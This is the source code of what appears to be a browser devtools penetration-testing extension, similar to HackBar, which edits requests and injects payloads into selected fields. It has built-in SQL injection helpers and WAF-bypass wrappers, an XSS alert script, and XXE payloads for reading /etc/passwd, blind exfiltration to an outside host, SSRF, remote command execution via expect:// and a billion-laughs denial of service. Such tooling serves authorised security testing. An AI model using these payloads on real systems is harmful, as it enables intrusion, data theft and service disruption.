let urlField = $('#url_field');
let postDataField = $('#post_data_field');
let refererField = $('#referer_field');
let userAgentField = $('#user_agent_field');
let cookieField = $('#cookie_field');
let headerField = $('[name="header_field"]');

let loadUrlBtn = $('#load_url');
let splitUrlBtn = $('#split_url');
let executeBtn = $('#execute');

const menu_btn_array = [
  'md5',
  'sha1',
  'sha256',
  'rot13',
  'base64_encode',
  'base64_decode',
  'url_encode',
  'url_decode',
  'hex_encode',
  'hex_decode',
  'sql_mysql_char',
  'sql_basic_info_column',
  'sql_union_all_select',
  'sql_union_all_select_null',
  'sql_convert_utf8',
  'sql_convert_latin1',
  'sql_mssql_char',
  'sql_oracle_char',
  'sql_union_statement',
  'sql_spaces_to_inline_comments',
  'xss_string_from_charcode',
  'xss_html_characters',
  'xss_alert',
  'xxe_lfi',
  'xxe_blind',
  'xxe_load_resource',
  'xxe_ssrf',
  'xxe_rce',
  'xxe_xee_local',
  'xxe_xee_remove',
  'xxe_utf7',
  'jsonify',
  'uppercase',
  'lowercase',
  'plus_number',
  'minus_number',
  'sql_waf_bypass_1',
  'sql_waf_bypass_2',
  'sql_waf_bypass_3',
  'sql_waf_bypass_4',
];
const not_show_modal = ['plus_number', 'minus_number'];

let currentTabId =
  browser.devtools != undefined ? browser.devtools.inspectedWindow.tabId : null;
let currentFocusField = urlField;

let currentHeaders = [];

function onFocusListener() {
  currentFocusField = $(this);
}

/* Other function */
function jsonValid(text) {
  try {
    return JSON.parse(text);
  } catch (e) {
    return false;
  }
}

function getFieldFormData(dataString) {
  let fields = Array();
  let f_split = dataString.trim().split('&');
  for (let i in f_split) {
    let f = f_split[i].match(/(^.*?)=(.*)/);
    if (f.length === 3) {
      let item = {};
      item['name'] = f[1];
      item['value'] = unescape(f[2]);
      fields.push(item);
    }
  }
  return fields;
}

function urlEncode(inputStr) {
  return encodeURIComponent(inputStr);
}

function jsonBeautify(inputStr) {
  let jsonString = jsonValid(inputStr);
  if (jsonString) {
    return JSON.stringify(jsonString, null, 4);
  }
  return false;
}

function upperCaseString(inputStr) {
  return inputStr.toUpperCase();
}

function lowerCaseString(inputStr) {
  return inputStr.toLowerCase();
}

// toggle element
function toggleElement(elementBtn, elementBlock) {
  if (elementBtn.prop('checked')) {
    elementBlock.show();
  } else {
    elementBlock.hide();
  }
}

function loadUrl() {
  browser.runtime.sendMessage(
    {
      tabId: currentTabId,
      action: 'load_url',
      data: null,
    },
    function (message) {
      if ('url' in message && message.url) {
        urlField.val(decodeURI(message.url));
      }
      if ('data' in message && message.data && postDataField.val() === '') {
        postDataField.val(message.data);
      }
      if ('headers' in message && message.headers) {
        const h = message.headers;
        if (h.referer) {
          refererField.val(h.referer);
        }
        if (h.cookie) {
          cookieField.val(h.cookie);
        }
        if (h.custom.length !== []) {
          currentHeaders = h.custom;
          addCurrentHeaders(h.custom);
        }
      }
    }
  );
}

function addCurrentHeaders(customCurrentHeaders) {
  for (let index in customCurrentHeaders) {
    let headersAlreadyLoaded = $('[name="header_field"]');
    let alreadyExist = false;
    let value = index + ': ' + customCurrentHeaders[index];

    for (let i = 0; i < headersAlreadyLoaded.length; i++) {
      if (
        headersAlreadyLoaded[i].value.toLowerCase().trim() ===
        value.toLowerCase().trim()
      )
        alreadyExist = true;
    }

    if (alreadyExist) continue;

    let header = headerField.closest('.block');
    header = header.get(0).cloneNode(true);
    $(header).removeClass('block');
    $(header).find('input').removeAttr('disabled');
    $(header)
      .find('input')
      .val(index + ': ' + customCurrentHeaders[index]);
    headerField.closest('.block').after(header);
  }
}

function splitUrl() {
  let uri = currentFocusField.val();
  uri = uri.replace(new RegExp(/&/g), '\n&');
  uri = uri.replace(new RegExp(/\?/g), '\n?');
  currentFocusField.val(uri);
  return true;
}

function exec(cmd) {
  return browser.devtools.inspectedWindow.eval(cmd);
}
let start;
let finish;
function execute() {
  let Headers = {
    referer: null,
    user_agent: null,
    cookie: null,
    custom: null,
  };

  let post_data = null;
  let method = 'GET';

  if ($('[name="header_field"]').not(':disabled').length > 0) {
    let customHeaders = $('[name="header_field"]').not(':disabled');
    Headers.custom = [];

    for (let i = 0; i < customHeaders.length; i++) {
      let header = customHeaders[i].value;

      if (!header.match(/[a-zA-Z\-]*: .*/)) continue;

      [key, value] = header.split(': ', 2);
      Headers.custom[key.trim()] = value.trim();
    }
  }

  let url = urlField.val();
  url = url.replace(new RegExp(/\n|\r/g), '').trim();
  if (!new RegExp(/^(http:\/\/|https:\/\/|view-source:)/gi).test(url)) {
    url = 'http://' + url;
  }
  if (!url) {
    return;
  }
  if (method === 'GET') {
    let uri = new URL(url);

    let code = 'const url = "' + encodeURIComponent(url) + '";';
    code += 'window.location.href = decodeURIComponent(url);';

    if (uri.hash !== '') code += 'window.location.reload(true);';

    browser.devtools.inspectedWindow.eval(code, function (result, isException) {
      setTimeout(() => {
        currentFocusField.focus();
      }, 100);
    });
    document.getElementById('url_field').focus();
    document.getElementById('url_field').setSelectionRange(start, finish);
  } else {
    let code =
      'var post_data = "' +
      encodeURIComponent(JSON.stringify(post_data)) +
      '"; var url = "' +
      encodeURIComponent(url) +
      '";';
    code += 'var fields = JSON.parse(decodeURIComponent(post_data));';
    code += 'const form = document.createElement("form");';
    code += 'form.setAttribute("method", "post");';
    code += 'form.setAttribute("action", decodeURIComponent(url));';
    code +=
      'fields.forEach(function(f) { var input = document.createElement("input"); input.setAttribute("type", "hidden"); input.setAttribute("name", f[\'name\']); input.setAttribute("value", f[\'value\']); form.appendChild(input); });';
    code += 'document.body.appendChild(form);';
    code += 'form.submit();';
    exec(code);
  }

  browser.runtime.sendMessage({
    tabId: currentTabId,
    action: 'send_requests',
    data: { headers: Headers },
  });
}

function getSelectedText(callbackFunction, type = '') {
  const selectionStart = currentFocusField.prop('selectionStart');
  const selectionEnd = currentFocusField.prop('selectionEnd');
  if (selectionEnd - selectionStart < 1 && !not_show_modal.includes(type)) {
    $('#myModal').modal();
    $('#myModal input').val('');
    $('#myModal button').bind('click', () => {
      const selected_text = $('#myModal input').val();
      callbackFunction(selected_text);
      $('#myModal').modal('hide');
    });
  } else {
    callbackFunction(
      currentFocusField
        .val()
        .substr(selectionStart, selectionEnd - selectionStart)
    );
  }
}

function setSelectedText(str) {
  let selectionStart = currentFocusField.prop('selectionStart');
  let selectionEnd = currentFocusField.prop('selectionEnd');
  let pre = currentFocusField.val().substr(0, selectionStart);
  let post = currentFocusField
    .val()
    .substr(selectionEnd, currentFocusField.val().length);
  currentFocusField.val(pre + str + post);
  currentFocusField[0].setSelectionRange(
    selectionStart,
    selectionEnd + str.length
  );
}
// listenener function
function onclickMenu(action, val) {
  switch (action) {
    case 'sql_waf_bypass_1':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(`/*!12345${txt.replaceAll(' ', '+')}*/`);
        }
      });
      break;
    case 'sql_waf_bypass_2':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(`/*!50000${txt.replaceAll(' ', '+')}*/`);
        }
      });
      break;
    case 'sql_waf_bypass_3':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(`/*!13337${txt.replaceAll(' ', '+')}*/`);
        }
      });
      break;
    case 'sql_waf_bypass_4':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(`%23AAAAA%0A${txt}`);
        }
      });
      break;
    case 'md5':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(Encrypt.md5(txt));
        }
      });
      break;
    case 'sha1':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(Encrypt.sha1(txt));
        }
      });
      break;
    case 'sha256':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(Encrypt.sha2(txt));
        }
      });
      break;
    case 'rot13':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(Encrypt.rot13(txt));
        }
      });
      break;
    case 'base64_encode':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(Encrypt.base64Encode(txt));
        }
      });
      break;
    case 'base64_decode':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(Encrypt.base64Decode(txt));
        }
      });
      break;
    case 'url_encode':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(urlEncode(txt));
        }
      });
      break;
    case 'url_decode':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(decodeURI(txt));
        }
      });
      break;
    case 'hex_encode':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(Encrypt.strToHex(txt));
        }
      });
      break;
    case 'hex_decode':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(Encrypt.hexToStr(txt));
        }
      });
      break;
    case 'jsonify':
      getSelectedText(function (txt) {
        if (txt && jsonBeautify(txt)) {
          setSelectedText(jsonBeautify(txt));
        }
      });
      break;
    case 'uppercase':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(upperCaseString(txt));
        }
      });
      break;
    case 'lowercase':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(lowerCaseString(txt));
        }
      });
      break;
    case 'sql_mysql_char':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText(SQL.selectionToSQLChar('mysql', txt));
        }
      });
      break;
    case 'plus_number':
      getSelectedText(function (txt) {
        if (txt >= 0 && txt) {
          start = document.getElementById('url_field').selectionStart;
          finish = document.getElementById('url_field').selectionEnd;
          setSelectedText(parseInt(txt) + 1);
          execute();
        }
      }, 'plus_number');
      break;
    case 'minus_number':
      getSelectedText(function (txt) {
        if (txt >= 0 && txt) {
          start = document.getElementById('url_field').selectionStart;
          finish = document.getElementById('url_field').selectionEnd;
          setSelectedText(parseInt(txt) - 1);
          execute();
        }
      }, 'minus_number');
      break;

    case 'sql_basic_info_column':
      let sqlBasicStr = 'CONCAT_WS(CHAR(32,58,32),user(),database(),version())';
      this.setSelectedText(sqlBasicStr);
      break;

    case 'sql_convert_utf8':
      getSelectedText(function (txt) {
        if (txt) {
          setSelectedText('CONVERT(' + txt + ' USING utf8)');
        }
      });
      break;
    case 'sql_convert_latin1':
      getSelectedText(function (txt) {
        if (txt) {
          const newString = 'CONVERT(' + txt + ' USING latin1)';
          setSelectedText(newString);
        }
      });
      break;

    case 'sql_mssql_char':
      getSelectedText(function (txt) {
        if (txt) {
          const newString = SQL.selectionToSQLChar('mssql', txt);
          setSelectedText(newString);
        }
      });
      break;

    case 'sql_oracle_char':
      getSelectedText(function (txt) {
        if (txt) {
          const newString = SQL.selectionToSQLChar('oracle', txt);
          setSelectedText(newString);
        }
      });
      break;

    case 'sql_union_statement':
      getSelectedText(function (txt) {
        if (txt) {
          const newString = SQL.selectionToUnionSelect(txt);
          setSelectedText(newString);
        }
      });
      break;

    case 'sql_union_all_select':
      getSelectedText(function (txt) {
        if (txt) {
          const newString = SQL.selectionToUnionAllSelect(txt);
          setSelectedText(newString);
        }
      });
      break;

    case 'sql_union_all_select_null':
      getSelectedText(function (txt) {
        if (txt) {
          const newString = SQL.selectionToUnionAllSelectNULL(txt);
          setSelectedText(newString);
        }
      });
      break;

    case 'sql_spaces_to_inline_comments':
      getSelectedText(function (txt) {
        if (txt) {
          const newString = SQL.selectionToInlineComments(txt);
          setSelectedText(newString);
        }
      });
      break;

    case 'xss_string_from_charcode':
      getSelectedText(function (txt) {
        if (txt) {
          const newString = XSS.selectionToChar('stringFromCharCode', txt);
          setSelectedText(newString);
        }
      });
      break;

    case 'xss_html_characters':
      getSelectedText(function (txt) {
        if (txt) {
          const newString = XSS.selectionToChar('htmlChar', txt);
          setSelectedText(newString);
        }
      });
      break;

    case 'xss_alert':
      const alertStr = '<script>alert(1)</script>';
      this.setSelectedText(alertStr);
      break;

    case 'LFI':
      this.setSelectedText(val);
      break;

    case 'xxe_lfi':
      var xxeStr =
        '<?xml version="1.0"?>' +
        '<!DOCTYPE foo [  ' +
        '<!ELEMENT foo (#ANY)>' +
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
      this.setSelectedText(xxeStr);
      break;

    case 'xxe_blind':
      var xxeStr =
        '<?xml version="1.0"?>' +
        '<!DOCTYPE foo [' +
        '<!ELEMENT foo (#ANY)>' +
        '<!ENTITY % xxe SYSTEM "file:///etc/passwd">' +
        '<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>';
      this.setSelectedText(xxeStr);
      break;

    case 'xxe_load_resource':
      var xxeStr =
        '<?xml version="1.0"?>' +
        '<!DOCTYPE foo [' +
        '<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>' +
        '<foo><result>&ac;</result></foo>';
      this.setSelectedText(xxeStr);
      break;

    case 'xxe_ssrf':
      var xxeStr =
        '<?xml version="1.0"?>' +
        '<!DOCTYPE foo [  ' +
        '<!ELEMENT foo (#ANY)>' +
        '<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>';
      this.setSelectedText(xxeStr);
      break;

    case 'xxe_rce':
      var xxeStr =
        '[ run "uname" command]' +
        '<?xml version="1.0" encoding="ISO-8859-1"?>' +
        '<!DOCTYPE foo [ <!ELEMENT foo ANY >' +
        '<!ENTITY xxe SYSTEM "expect://uname" >]>' +
        '<creds>' +
        '    <user>&xxe;</user>' +
        '</creds>';
      this.setSelectedText(xxeStr);
      break;

    case 'xxe_xee_local':
      var xxeStr =
        '<?xml version="1.0"?>' +
        '<!DOCTYPE lolz [' +
        '<!ENTITY lol "lol">' +
        '<!ELEMENT lolz (#PCDATA)>' +
        '<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' +
        '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">' +
        '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">' +
        '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">' +
        '<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">' +
        '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">' +
        '<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">' +
        '<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">' +
        '<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">' +
        ']>' +
        '<lolz>&lol9;</lolz>';
      this.setSelectedText(xxeStr);
      break;

    case 'xxe_xee_remove':
      var xxeStr =
        '<?xml version="1.0"?>' +
        '<!DOCTYPE lolz [' +
        '<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>' +
        '<lolz><lol>3..2..1...&test<lol></lolz>';
      this.setSelectedText(xxeStr);
      break;

    case 'xxe_utf7':
      var xxeStr =
        '<?xml version="1.0" encoding="UTF-7"?>' +
        '+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4' +
        '+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+' +
        '+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4';
      this.setSelectedText(xxeStr);
      break;
  }
  currentFocusField.focus();
}

//on focus listener field
urlField.bind('click', onFocusListener, false);
postDataField.bind('click', onFocusListener, false);
refererField.bind('click', onFocusListener, false);
userAgentField.bind('click', onFocusListener, false);
cookieField.bind('click', onFocusListener, false);

//Events
loadUrlBtn.bind('click', function () {
  loadUrl();
});
splitUrlBtn.bind('click', function () {
  splitUrl();
});
executeBtn.bind('click', function () {
  execute();
});

//Add event listener
menu_btn_array.forEach(function (elementID) {
  $('#' + elementID).bind('click', function () {
    onclickMenu(elementID);
  });
});

$('#lfi .lfi_data').bind('click', function (e) {
  onclickMenu('LFI', this.text);
});

// Keyboard listener
$(document).on('keypress', function (event) {
  if ('key' in event && event.ctrlKey && event.charCode === 13) {
    execute();
  }
});

$('#url_encode_quick').bind('click', function (e) {
  getSelectedText(function (txt) {
    if (txt) {
      setSelectedText(urlEncode(txt));
    }
  });
});

$('#url_decode_quick').bind('click', function (e) {
  getSelectedText(function (txt) {
    if (txt) {
      setSelectedText(decodeURIComponent(txt));
    }
  });
});

$('#hex_encode_quick').bind('click', function (e) {
  getSelectedText(function (txt) {
    if (txt) {
      setSelectedText('0x' + Encrypt.strToHex(txt));
    }
  });
});

$('#hex_decode_quick').bind('click', function (e) {
  getSelectedText(function (txt) {
    if (txt) {
      setSelectedText(Encrypt.hexToStr(txt.substr(2)));
    }
  });
});

$('#replace_quick').bind('click', function (e) {
  $('#url_field').val(
    $('#url_field')
      .val()
      .replace($('#current-keyword').val(), $('#new-keyword').val())
  );
});

$('#replace_all_quick').bind('click', function (e) {
  $('#url_field').val(
    $('#url_field')
      .val()
      .replaceAll($('#current-keyword').val(), $('#new-keyword').val())
  );
});

$('#waf_bypass_quick').bind('click', function (e) {
  getSelectedText(function (txt) {
    if (txt) {
      setSelectedText(`/*!12345${txt.replaceAll(' ', '+')}*/`);
    }
  });
});
